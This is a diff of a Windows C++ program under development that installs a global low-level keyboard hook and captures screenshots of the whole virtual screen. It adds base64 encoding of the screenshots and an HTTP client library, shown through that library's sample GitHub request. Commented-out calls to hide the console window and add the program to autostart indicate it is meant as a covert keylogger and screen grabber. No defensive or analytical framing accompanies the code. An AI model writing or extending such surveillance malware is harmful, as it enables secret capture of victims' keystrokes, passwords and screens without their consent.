@@ -1,14 +1,40 @@
 #include <iostream>
 #include <windows.h>
 #include "lodepng.h"
+#include "base64.h"
 
 
 
 using namespace std;
-
+#include <cpr/cpr.h>
 
 HHOOK hHook = NULL;
 bool capsLock = false;
+
+
+std::string convertUnsignedCharVectorToString(std::vector<unsigned char> vector)
+{
+    string s = "";
+
+    for(auto &uc : vector)
+    {
+        s += (char)uc;
+    }
+    return s;
+}
+
+std::vector<unsigned char> convertStringToUnsignedCharVector(std::string s)
+{
+    std::vector<unsigned char> vector;
+
+    for(auto &c : s)
+    {
+        vector.emplace_back((unsigned char)c);
+    }
+
+    return vector;
+}
+
 
 LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
     if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
@@ -126,6 +152,10 @@ std::vector<unsigned char> getScreenshot()
     int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 
+    std::cout << x << std::endl;
+    std::cout << y << std::endl;
+    std::cout << cx << std::endl;
+    std::cout << cy << std::endl;
 
     std::vector<unsigned char> png;
 
@@ -183,21 +213,27 @@ std::vector<unsigned char> getScreenshot()
     ReleaseDC(NULL,dcScreen);
     DeleteObject(bmpTarget);
 
-    /*for(int i = 0;i<png.size();i++)
-    {
-        std::cout << (int)png[i];
-    }*/
-
     return png;
 }
 
 int main()
 {
+    //sets dpi process awareness to prevent the getsystemmetrics functions from returning false values
+    SetProcessDPIAware();
     SetConsoleOutputCP(CP_UTF8);
     //hideConsoleWindow();
 
     //addToAutostart();
-    lodepng::save_file(getScreenshot(),"test.png");
+    cpr::Response r = cpr::Get(cpr::Url{"https://api.github.com/repos/whoshuu/cpr/contributors"},
+                               cpr::Authentication{"user", "pass", cpr::AuthMode::BASIC},
+                               cpr::Parameters{{"anon", "true"}, {"key", "value"}});
+    r.status_code;                  // 200
+    r.header["content-type"];       // application/json; charset=utf-8
+    r.text;                         // JSON text string
+    //std::cout << r.text;
+
+    string screenB64 = base64_encode(convertUnsignedCharVectorToString(getScreenshot()));
+    lodepng::save_file(convertStringToUnsignedCharVector(base64_decode(screenB64)),"test.png");
     capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
     if (hHook == NULL) {
